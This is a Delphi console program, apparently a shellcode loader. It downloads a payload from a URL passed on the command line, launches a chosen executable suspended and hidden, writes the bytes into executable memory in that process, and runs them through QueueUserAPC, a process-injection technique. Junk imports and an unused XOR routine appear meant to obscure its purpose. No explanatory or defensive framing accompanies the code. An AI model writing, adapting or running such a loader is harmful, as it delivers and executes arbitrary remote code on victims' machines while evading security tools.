program inmemory2;

{$APPTYPE CONSOLE}

uses
  SysUtils,HighDpi, Classes,
  //messages,
  Types,ServicesRT,FMX.Objects3D,
  shellapi,
  vcl.Graphics,IdHTTP,(*urlmon,(*
  ufGlobHook in 'ufGlobHook.pas' {frmHook},forms*)(*Permissions,*)DAO2000, GraphView(*,Excel2010*),Winapi.Windows;



function DownloadTextToByteArrayaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa(const URL: string): TBytes;
var
  HTTP: TIdHTTP;
  MemoryStream: TMemoryStream;
begin
  HTTP := TIdHTTP.Create(nil);
  MemoryStream := TMemoryStream.Create;
  try
    HTTP.Get(URL, MemoryStream);
    MemoryStream.Position := 0;
    SetLength(Result, MemoryStream.Size);
    MemoryStream.ReadBuffer(Result[0], MemoryStream.Size);
  finally
    HTTP.Free;
    MemoryStream.Free;
  end;
end;

function Crypt(const aText: byte): byte;
const
  PWD = 'a';   // key used for XOR

begin
    result := byte(Ord(aText) xor  Ord(PWD));
end;

var
  AProcessInfo: TProcessInformation;
  AStartupInfo: TStartupInfo;
  pAddress: Pointer;
  Written : SIZE_T;
  ByteArray: TBytes;
  rawbytes: array [0..459] of byte;
  URL: string;
  Text: string;
  i:integer;
begin
  try
    URL := paramstr(1);
    ByteArray := DownloadTextToByteArrayaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa(URL);
    for i:=0 to length(ByteArray)-1 do
      rawbytes[i]:=bytearray[i];
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
  ZeroMemory(@AProcessInfo, SizeOf(TProcessInformation));
  ZeroMemory(@AStartupInfo, Sizeof(TStartupInfo));
  AStartupInfo.cb := SizeOf(TStartupInfo);
  AStartupInfo.wShowWindow := 0;
  AStartupInfo.dwFlags := (STARTF_USESHOWWINDOW);
  if not CreateProcessW(PChar(paramstr(2)), nil, nil, nil, False, CREATE_SUSPENDED, nil, nil, AStartupInfo, AProcessInfo)
   then begin
         writeln('no');
         exit;
        end
   else
    writeln('yes');
  try
  writeln(length(ByteArray));
    writeln(length(rawbytes));
    pAddress := VirtualAllocEx(AProcessInfo.hProcess, nil, Length(rawbytes), MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    writeln(1);
    if not Assigned(pAddress) then Exit;
    writeln(2);
    if not WriteProcessMemory(AProcessInfo.hProcess, pAddress, @rawbytes, Length(rawbytes), Written) then Exit;
    writeln(3);
    if not QueueUserAPC(pAddress, AProcessInfo.hThread, 0) then Exit;
    writeln(4);
    ResumeThread(AProcessInfo.hThread);
    writeln(5);
  finally
    CloseHandle(AProcessInfo.hThread);
    CloseHandle(AProcessInfo.hProcess);
  end;
end.
